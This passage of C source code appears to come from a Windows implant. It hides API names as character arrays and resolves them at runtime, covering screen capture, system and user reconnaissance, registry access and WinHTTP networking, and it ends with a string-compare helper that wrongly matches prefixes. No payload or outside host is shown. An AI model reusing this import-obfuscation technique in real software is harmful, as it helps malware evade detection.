	CHAR pGetEnvironmentVariableA[] = { 'G', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'A', 0x0 };
	pWinApi->GetEnvironmentVariableA = (GETNENVVARA)Resolve(pWinApi, pKernel32, pGetEnvironmentVariableA);
	CHAR pGetEnvironmentVariableW[] = { 'G', 'e', 't', 'E', 'n', 'v', 'i', 'r', 'o', 'n', 'm', 'e', 'n', 't', 'V', 'a', 'r', 'i', 'a', 'b', 'l', 'e', 'W', 0x0 };
	pWinApi->GetEnvironmentVariable = (GETNENVVAR)Resolve(pWinApi, pKernel32, pGetEnvironmentVariableW);
	CHAR pLocalFree[] = { 'L', 'o', 'c', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	pWinApi->LocalFree = (LOCALFREE)Resolve(pWinApi, pKernel32, pLocalFree);
	CHAR pCompareFileTime[] = { 'C', 'o', 'm', 'p', 'a', 'r', 'e', 'F', 'i', 'l', 'e', 'T', 'i', 'm', 'e', 0x0 };
	pWinApi->CompareFileTime = (COMPAREFILETIME)Resolve(pWinApi, pKernel32, pCompareFileTime);
	CHAR pGlobalAlloc[] = { 'G', 'l', 'o', 'b', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
	pWinApi->GlobalAlloc = (GLOBALALLOC)Resolve(pWinApi, pKernel32, pGlobalAlloc);
	CHAR pGlobalLock[] = { 'G', 'l', 'o', 'b', 'a', 'l', 'L', 'o', 'c', 'k', 0x0 };
	pWinApi->GlobalLock = (GLOBALLOCK)Resolve(pWinApi, pKernel32, pGlobalLock);
	CHAR pGlobalFree[] = { 'G', 'l', 'o', 'b', 'a', 'l', 'F', 'r', 'e', 'e', 0x0 };
	pWinApi->GlobalFree = (GLOBALFREE)Resolve(pWinApi, pKernel32, pGlobalFree);
	CHAR pGlobalUnlock[] = { 'G', 'l', 'o', 'b', 'a', 'l', 'U', 'n', 'l', 'o', 'c', 'k', 0x0 };
	pWinApi->GlobalUnlock = (GLOBALUNLOCK)Resolve(pWinApi, pKernel32, pGlobalUnlock);
	CHAR pGetNativeSystemInfo[] = { 'G', 'e', 't', 'N', 'a', 't', 'i', 'v', 'e', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 0x0 };
	pWinApi->GetNativeSystemInfo = (GETNATIVEINFO)Resolve(pWinApi, pKernel32, pGetNativeSystemInfo);
	CHAR pGlobalMemoryStatusEx[] = { 'G', 'l', 'o', 'b', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 'S', 't', 'a', 't', 'u', 's', 'E', 'x', 0x0 };
	pWinApi->GlobalMemoryStatusEx = (GLOBALMEMSTAT)Resolve(pWinApi, pKernel32, pGlobalMemoryStatusEx);
	CHAR pGetSystemInfo[] = { 'G', 'e', 't', 'S', 'y', 's', 't', 'e', 'm', 'I', 'n', 'f', 'o', 0x0 };
	pWinApi->GetSystemInfo = (GETSYSINFO)Resolve(pWinApi, pKernel32, pGetSystemInfo);
	CHAR pGetLocaleInfoW[] = { 'G', 'e', 't', 'L', 'o', 'c', 'a', 'l', 'e', 'I', 'n', 'f', 'o', 'W', 0x0 };
	pWinApi->GetLocaleInfo = (GETLOCALEINFO)Resolve(pWinApi, pKernel32, pGetLocaleInfoW);
	CHAR pGetDiskFreeSpaceEx[] = { 'G', 'e', 't', 'D', 'i', 's', 'k', 'F', 'r', 'e', 'e', 'S', 'p', 'a', 'c', 'e', 'E', 'x', 'W', 0x0 };
	pWinApi->GetDiskFreeSpaceEx = (GETFREEDISK)Resolve(pWinApi, pKernel32, pGetDiskFreeSpaceEx);
	CHAR pGetCurrentProcess[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	pWinApi->GetCurrentProcess = (GETCURRPROC)Resolve(pWinApi, pKernel32, pGetCurrentProcess);
	CHAR pIsWow64Process[] = { 'I', 's', 'W', 'o', 'w', '6', '4', 'P', 'r', 'o', 'c', 'e', 's', 's', 0x0 };
	pWinApi->IsWow64Process = (ISWOW64)Resolve(pWinApi, pKernel32, pIsWow64Process);
	CHAR pOutputDebugStringA[] = { 'O', 'u', 't', 'p', 'u', 't', 'D', 'e', 'b', 'u', 'g', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0x0 };
	pWinApi->OutputDebugStringA = (OUTPUTDEBUGA)Resolve(pWinApi, pKernel32, pOutputDebugStringA);
	CHAR pOutputDebugStringW[] = { 'O', 'u', 't', 'p', 'u', 't', 'D', 'e', 'b', 'u', 'g', 'S', 't', 'r', 'i', 'n', 'g', 'W', 0x0 };
	pWinApi->OutputDebugString = (OUTPUTDEBUG)Resolve(pWinApi, pKernel32, pOutputDebugStringW);
	CHAR pGetModuleFileNameA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'A', 0x0 };
	pWinApi->GetModuleFileNameA = (GETMODULENAMEA)Resolve(pWinApi, pKernel32, pGetModuleFileNameA);
	CHAR pGetModuleFileNameW[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'F', 'i', 'l', 'e', 'N', 'a', 'm', 'e', 'W', 0x0 };
	pWinApi->GetModuleFileName = (GETMODULENAME)Resolve(pWinApi, pKernel32, pGetModuleFileNameW);
	CHAR pGetModuleHandleA[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', 0x0 };
	pWinApi->GetModuleHandleA = (GETMODULEHA)Resolve(pWinApi, pKernel32, pGetModuleHandleA);
	CHAR pGetModuleHandleW[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'W', 0x0 };
	pWinApi->GetModuleHandle = (GETMODULEH)Resolve(pWinApi, pKernel32, pGetModuleHandleW);
	CHAR plstrlenA[] = { 'l', 's', 't', 'r', 'l', 'e', 'n', 'A', 0x0 };
	pWinApi->lstrlenA = (STRLENA)Resolve(pWinApi, pKernel32, plstrlenA);
	CHAR plstrlenW[] = { 'l', 's', 't', 'r', 'l', 'e', 'n', 'W', 0x0 };
	pWinApi->lstrlenW = (STRLENW)Resolve(pWinApi, pKernel32, plstrlenW);


	// GDIPLUS
	CHAR pGdiplus[] = { 'g', 'd', 'i', 'p', 'l', 'u', 's', '.', 'd', 'l', 'l', 0x0 };

	CHAR pGdiplusShutdown[] = { 'G', 'd', 'i', 'p', 'l', 'u', 's', 'S', 'h', 'u', 't', 'd', 'o', 'w', 'n', 0x0 };
	pWinApi->GdiplusShutdown = (GDISHUTDOWN)Resolve(pWinApi, pGdiplus, pGdiplusShutdown);
	CHAR pGdiplusStartup[] = { 'G', 'd', 'i', 'p', 'l', 'u', 's', 'S', 't', 'a', 'r', 't', 'u', 'p', 0x0 };
	pWinApi->GdiplusStartup = (GDIPLUSSTART)Resolve(pWinApi, pGdiplus, pGdiplusStartup);


	// USER32
	CHAR pUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0x0 };

	CHAR pGetWindowInfo[] = { 'G', 'e', 't', 'W', 'i', 'n', 'd', 'o', 'w', 'I', 'n', 'f', 'o', 0x0 };
	pWinApi->GetWindowInfo = (GETWINDOWINFO)Resolve(pWinApi, pUser32, pGetWindowInfo);
	CHAR pGetDesktopWindow[] = { 'G', 'e', 't', 'D', 'e', 's', 'k', 't', 'o', 'p', 'W', 'i', 'n', 'd', 'o', 'w', 0x0 };
	pWinApi->GetDesktopWindow = (GETDESKWINDOW)Resolve(pWinApi, pUser32, pGetDesktopWindow);
	CHAR pGetDC[] = { 'G', 'e', 't', 'D', 'C', 0x0 };
	pWinApi->GetDC = (GETDC)Resolve(pWinApi, pUser32, pGetDC);
	CHAR pReleaseDC[] = { 'R', 'e', 'l', 'e', 'a', 's', 'e', 'D', 'C', 0x0 };
	pWinApi->ReleaseDC = (RELEASEDC)Resolve(pWinApi, pUser32, pReleaseDC);
	CHAR pMessageBoxW[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0x0 };
	pWinApi->MessageBox = (MESSAGEBOX)Resolve(pWinApi, pUser32, pMessageBoxW);
	CHAR pGetLastInputInfo[] = { 'G', 'e', 't', 'L', 'a', 's', 't', 'I', 'n', 'p', 'u', 't', 'I', 'n', 'f', 'o', 0x0 };
	pWinApi->GetLastInputInfo = (GETLASTINPUT)Resolve(pWinApi, pUser32, pGetLastInputInfo);
	CHAR pGetForegroundWindow[] = { 'G', 'e', 't', 'F', 'o', 'r', 'e', 'g', 'r', 'o', 'u', 'n', 'd', 'W', 'i', 'n', 'd', 'o', 'w', 0x0 };
	pWinApi->GetForegroundWindow = (GETFOREWIN)Resolve(pWinApi, pUser32, pGetForegroundWindow);


	// ADVAPI32
	CHAR pAdvapi32[] = { 'a', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0x0 };

	CHAR pGetTokenInformation[] = { 'G', 'e', 't', 'T', 'o', 'k', 'e', 'n', 'I', 'n', 'f', 'o', 'r', 'm', 'a', 't', 'i', 'o', 'n', 0x0 };
	pWinApi->GetTokenInformation = (GETTOKENINFO)Resolve(pWinApi, pAdvapi32, pGetTokenInformation);
	CHAR pConvertSidToStringSidA[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'S', 'i', 'd', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'S', 'i', 'd', 'A', 0x0 };
	pWinApi->ConvertSidToStringSidA = (SIDTOSTRINGA)Resolve(pWinApi, pAdvapi32, pConvertSidToStringSidA);
	CHAR pConvertSidToStringSidW[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'S', 'i', 'd', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'S', 'i', 'd', 'W', 0x0 };
	pWinApi->ConvertSidToStringSid = (SIDTOSTRING)Resolve(pWinApi, pAdvapi32, pConvertSidToStringSidW);
	CHAR pRegEnumKeyExW[] = { 'R', 'e', 'g', 'E', 'n', 'u', 'm', 'K', 'e', 'y', 'E', 'x', 'W', 0x0 };
	pWinApi->RegEnumKeyEx = (REGENUMKEY)Resolve(pWinApi, pAdvapi32, pRegEnumKeyExW);
	CHAR pRegOpenKeyExW[] = { 'R', 'e', 'g', 'O', 'p', 'e', 'n', 'K', 'e', 'y', 'E', 'x', 'W', 0x0 };
	pWinApi->RegOpenKeyEx = (REGOPENKEY)Resolve(pWinApi, pAdvapi32, pRegOpenKeyExW);
	CHAR pRegQueryValueExW[] = { 'R', 'e', 'g', 'Q', 'u', 'e', 'r', 'y', 'V', 'a', 'l', 'u', 'e', 'E', 'x', 'W', 0x0 };
	pWinApi->RegQueryValueEx = (REGQUERYVAL)Resolve(pWinApi, pAdvapi32, pRegQueryValueExW);
	CHAR pRegCloseKey[] = { 'R', 'e', 'g', 'C', 'l', 'o', 's', 'e', 'K', 'e', 'y', 0x0 };
	pWinApi->RegCloseKey = (REGCLOSEKEY)Resolve(pWinApi, pAdvapi32, pRegCloseKey);
	CHAR pGetUserNameW[] = { 'G', 'e', 't', 'U', 's', 'e', 'r', 'N', 'a', 'm', 'e', 'W', 0x0 };
	pWinApi->GetUserName = (GETUSERNAME)Resolve(pWinApi, pAdvapi32, pGetUserNameW);
	CHAR pOpenProcessToken[] = { 'O', 'p', 'e', 'n', 'P', 'r', 'o', 'c', 'e', 's', 's', 'T', 'o', 'k', 'e', 'n', 0x0 };
	pWinApi->OpenProcessToken = (OPENPROCTOKEN)Resolve(pWinApi, pAdvapi32, pOpenProcessToken);


	// OLE32
	CHAR pOle32[] = { 'o', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', 0x0 };

	CHAR pCoInitialize[] = { 'C', 'o', 'I', 'n', 'i', 't', 'i', 'a', 'l', 'i', 'z', 'e', 0x0 };
	pWinApi->CoInitialize = (COINITIALIZE)Resolve(pWinApi, pOle32, pCoInitialize);
	CHAR pCreateStreamOnHGlobal[] = { 'C', 'r', 'e', 'a', 't', 'e', 'S', 't', 'r', 'e', 'a', 'm', 'O', 'n', 'H', 'G', 'l', 'o', 'b', 'a', 'l', 0x0 };
	pWinApi->CreateStreamOnHGlobal = (CREATESTREAMOG)Resolve(pWinApi, pOle32, pCreateStreamOnHGlobal);
	CHAR pCoUninitialize[] = { 'C', 'o', 'U', 'n', 'i', 'n', 'i', 't', 'i', 'a', 'l', 'i', 'z', 'e', 0x0 };
	pWinApi->CoUninitialize = (COUNINITIALIZE)Resolve(pWinApi, pOle32, pCoUninitialize);


	// WINHTTP
	CHAR pWinhttp[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', '.', 'd', 'l', 'l', 0x0 };

	CHAR pWinHttpReceiveResponse[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0x0 };
	pWinApi->WinHttpReceiveResponse = (WINHTTPGETRESP)Resolve(pWinApi, pWinhttp, pWinHttpReceiveResponse);
	CHAR pWinHttpReadData[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0x0 };
	pWinApi->WinHttpReadData = (WINHTTPREAD)Resolve(pWinApi, pWinhttp, pWinHttpReadData);
	CHAR pWinHttpOpen[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0x0 };
	pWinApi->WinHttpOpen = (WINHTTPOPEN)Resolve(pWinApi, pWinhttp, pWinHttpOpen);
	CHAR pWinHttpGetIEProxyConfigForCurrentUser[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'G', 'e', 't', 'I', 'E', 'P', 'r', 'o', 'x', 'y', 'C', 'o', 'n', 'f', 'i', 'g', 'F', 'o', 'r', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'U', 's', 'e', 'r', 0x0 };
	pWinApi->WinHttpGetIEProxyConfigForCurrentUser = (WINHTTPPROXYC)Resolve(pWinApi, pWinhttp, pWinHttpGetIEProxyConfigForCurrentUser);
	CHAR pWinHttpGetProxyForUrl[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'G', 'e', 't', 'P', 'r', 'o', 'x', 'y', 'F', 'o', 'r', 'U', 'r', 'l', 0x0 };
	pWinApi->WinHttpGetProxyForUrl = (WINHTTPPROXYU)Resolve(pWinApi, pWinhttp, pWinHttpGetProxyForUrl);
	CHAR pWinHttpSetOption[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'O', 'p', 't', 'i', 'o', 'n', 0x0 };
	pWinApi->WinHttpSetOption = (WINHTTPSETOPT)Resolve(pWinApi, pWinhttp, pWinHttpSetOption);
	CHAR pWinHttpConnect[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0x0 };
	pWinApi->WinHttpConnect = (WINHTTPCONNECT)Resolve(pWinApi, pWinhttp, pWinHttpConnect);
	CHAR pWinHttpOpenRequest[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0x0 };
	pWinApi->WinHttpOpenRequest = (WINHTTPOPENREQ)Resolve(pWinApi, pWinhttp, pWinHttpOpenRequest);
	CHAR pWinHttpSetTimeouts[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'o', 'u', 't', 's', 0x0 };
	pWinApi->WinHttpSetTimeouts = (WINHTTPSETTIME)Resolve(pWinApi, pWinhttp, pWinHttpSetTimeouts);
	CHAR pWinHttpSendRequest[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0x0 };
	pWinApi->WinHttpSendRequest = (WINHTTPSENDREQ)Resolve(pWinApi, pWinhttp, pWinHttpSendRequest);
	CHAR pWinHttpCloseHandle[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0x0 };
	pWinApi->WinHttpCloseHandle = (WINHTTPCLOSEH)Resolve(pWinApi, pWinhttp, pWinHttpCloseHandle);
	CHAR pWinHttpQueryHeaders[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0x0 };
	pWinApi->WinHttpQueryHeaders = (WINHTTPQUERYH)Resolve(pWinApi, pWinhttp, pWinHttpQueryHeaders);


	// NETAPI32
	CHAR pNetapi32[] = { 'n', 'e', 't', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0x0 };

	CHAR pNetApiBufferFree[] = { 'N', 'e', 't', 'A', 'p', 'i', 'B', 'u', 'f', 'f', 'e', 'r', 'F', 'r', 'e', 'e', 0x0 };
	pWinApi->NetApiBufferFree = (NETAPIBUFFFREE)Resolve(pWinApi, pNetapi32, pNetApiBufferFree);
	CHAR pNetUserGetInfo[] = { 'N', 'e', 't', 'U', 's', 'e', 'r', 'G', 'e', 't', 'I', 'n', 'f', 'o', 0x0 };
	pWinApi->NetUserGetInfo = (NETUSERGETINFO)Resolve(pWinApi, pNetapi32, pNetUserGetInfo);


	//GDI32
	CHAR pGDI32[] = { 'g', 'd', 'i', '3', '2', '.', 'd', 'l', 'l', 0x0 };
	CHAR pCreateCompatibleBitmap[] = { 'C', 'r', 'e', 'a', 't', 'e', 'C', 'o', 'm', 'p', 'a', 't', 'i', 'b', 'l', 'e', 'B', 'i', 't', 'm', 'a', 'p', 0x0 };
	pWinApi->CreateCompatibleBitmap = (CREATECOMPBIT)Resolve(pWinApi, pGDI32, pCreateCompatibleBitmap);
	CHAR pSelectObject[] = { 'S', 'e', 'l', 'e', 'c', 't', 'O', 'b', 'j', 'e', 'c', 't', 0x0 };
	pWinApi->SelectObject = (SELECTOBJ)Resolve(pWinApi, pGDI32, pSelectObject);
	CHAR pStretchBlt[] = { 'S', 't', 'r', 'e', 't', 'c', 'h', 'B', 'l', 't', 0x0 };
	pWinApi->StretchBlt = (STRETCHBLTF)Resolve(pWinApi, pGDI32, pStretchBlt);
	CHAR pGetDIBits[] = { 'G', 'e', 't', 'D', 'I', 'B', 'i', 't', 's', 0x0 };
	pWinApi->GetDIBits = (GETDLBITS)Resolve(pWinApi, pGDI32, pGetDIBits);
	CHAR pDeleteObject[] = { 'D', 'e', 'l', 'e', 't', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0x0 };
	pWinApi->DeleteObject = (DELETEOBJ)Resolve(pWinApi, pGDI32, pDeleteObject);
	CHAR pDeleteDC[] = { 'D', 'e', 'l', 'e', 't', 'e', 'D', 'C', 0x0 };
	pWinApi->DeleteDC = (DELETEDC)Resolve(pWinApi, pGDI32, pDeleteDC);
	CHAR pCreateCompatibleDC[] = { 'C', 'r', 'e', 'a', 't', 'e', 'C', 'o', 'm', 'p', 'a', 't', 'i', 'b', 'l', 'e', 'D', 'C', 0x0 };
	pWinApi->CreateCompatibleDC = (CREATECOMPDC)Resolve(pWinApi, pGDI32, pCreateCompatibleDC);


	// CRT
	CHAR pMsvcrt[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0x0 };

	CHAR pwcsncat_s[] = { 'w', 'c', 's', 'n', 'c', 'a', 't', '_', 's', 0x0 };
	pWinApi->wcsncat_s = (WCSNCATS)Resolve(pWinApi, pMsvcrt, pwcsncat_s);
	CHAR pwcscat_s[] = { 'w', 'c', 's', 'c', 'a', 't', '_', 's', 0x0 };
	pWinApi->wcscat_s = (WCSCATS)Resolve(pWinApi, pMsvcrt, pwcscat_s);
	CHAR pwcscmp[] = { 'w', 'c', 's', 'c', 'm', 'p', 0x0 };
	pWinApi->wcscmp = (WCSCMP)Resolve(pWinApi, pMsvcrt, pwcscmp);
	CHAR pqsort[] = { 'q', 's', 'o', 'r', 't', 0x0 };
	pWinApi->qsort = (QSORT)Resolve(pWinApi, pMsvcrt, pqsort);
	CHAR p_snprintf_s[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', '_', 's', 0x0 };
	pWinApi->_snprintf_s = (SNPRINTFS)Resolve(pWinApi, pMsvcrt, p_snprintf_s);
	CHAR pswprintf_s[] = { 's', 'w', 'p', 'r', 'i', 'n', 't', 'f', '_', 's', 0x0 };
	pWinApi->swprintf_s = (SWPRINTFS)Resolve(pWinApi, pMsvcrt, pswprintf_s);
	CHAR pmemcmp[] = { 'm', 'e', 'm', 'c', 'm', 'p', 0x0 };
	pWinApi->memcmp = (MEMCMP)Resolve(pWinApi, pMsvcrt, pmemcmp);
	CHAR prand[] = { 'r', 'a', 'n', 'd', 0x0 };
	pWinApi->rand = (RAND)Resolve(pWinApi, pMsvcrt, prand);
	CHAR psrand[] = { 's', 'r', 'a', 'n', 'd', 0x0 };
	pWinApi->srand = (SRAND)Resolve(pWinApi, pMsvcrt, psrand);
	CHAR p_itow_s[] = { '_', 'i', 't', 'o', 'w', '_', 's', 0x0 };
	pWinApi->_itow_s = (ITOWS)Resolve(pWinApi, pMsvcrt, p_itow_s);
	CHAR prealloc[] = { 'r', 'e', 'a', 'l', 'l', 'o', 'c', 0x0 };
	pWinApi->realloc = (REALLOC)Resolve(pWinApi, pMsvcrt, prealloc);
	CHAR p_wtoi[] = { '_', 'w', 't', 'o', 'i', 0x0 };
	pWinApi->_wtoi = (WTOI)Resolve(pWinApi, pMsvcrt, p_wtoi);
	CHAR psscanf_s[] = { 's', 's', 'c', 'a', 'n', 'f', '_', 's', 0x0 };
	pWinApi->sscanf_s = (SSCANFS)Resolve(pWinApi, pMsvcrt, psscanf_s);
	CHAR pmemcpy[] = { 'm', 'e', 'm', 'c', 'p', 'y', 0x0 };
	pWinApi->memcpy = (MEMCPY)Resolve(pWinApi, pMsvcrt, pmemcpy);
	CHAR pfree[] = { 'f', 'r', 'e', 'e', 0x0 };
	pWinApi->free = (FREE)Resolve(pWinApi, pMsvcrt, pfree);
	CHAR pmemset[] = { 'm', 'e', 'm', 's', 'e', 't', 0x0 };
	pWinApi->memset = (MEMSET)Resolve(pWinApi, pMsvcrt, pmemset);
	CHAR pmalloc[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0x0 };
	pWinApi->malloc = (MALLOC)Resolve(pWinApi, pMsvcrt, pmalloc);
	CHAR pstrchr[] = { 's', 't', 'r', 'c', 'h', 'r', 0x0 };
	pWinApi->strchr = (STRCHR)Resolve(pWinApi, pMsvcrt, pstrchr);
	CHAR pwcscpy_s[] = { 'w', 'c', 's', 'c', 'p', 'y', '_', 's', 0x0 };
	pWinApi->wcscpy_s = (WCSCPYS)Resolve(pWinApi, pMsvcrt, pwcscpy_s);
	CHAR pisalnum[] = { 'i', 's', 'a', 'l', 'n', 'u', 'm', 0x0 };
	pWinApi->isalnum = (ISALNUM)Resolve(pWinApi, pMsvcrt, pisalnum);
	CHAR p_snwprintf_s[] = { '_', 's', 'n', 'w', 'p', 'r', 'i', 'n', 't', 'f', '_', 's', 0x0 };
	pWinApi->_snwprintf_s = (SNWPRINTFS)Resolve(pWinApi, pMsvcrt, p_snwprintf_s);
	CHAR pabs[] = { 'a', 'b', 's', 0x0 };
	pWinApi->abs = (ABS)Resolve(pWinApi, pMsvcrt, pabs);
	CHAR pwcslen[] = { 'w', 'c', 's', 'l', 'e', 'n', 0x0 };
	pWinApi->wcslen = (WCSLEN)Resolve(pWinApi, pMsvcrt, pwcslen);
	CHAR pwcsncpy_s[] = { 'w', 'c', 's', 'n', 'c', 'p', 'y', '_', 's', 0x0 };
	pWinApi->wcsncpy_s = (WCSNCPYS)Resolve(pWinApi, pMsvcrt, pwcsncpy_s);
}



__forceinline int my_strcmpi(PCHAR _src1, PCHAR _src2)
{
	char* s1 = _src1;
	char* s2 = _src2;

	while (*s1 && *s2)
	{
		char a = *s1;
		char b = *s2;

		my_toupper(&a);
		my_toupper(&b);

		if (a != b)
			return 1;

		s1++;
		s2++;
	}

	return 0;
}

__forceinline void my_toupper(PCHAR c)
{
	if((*c >= 'a') && (*c <= 'z'))
		*c = 'A' + (*c - 'a');
}

*/
#endif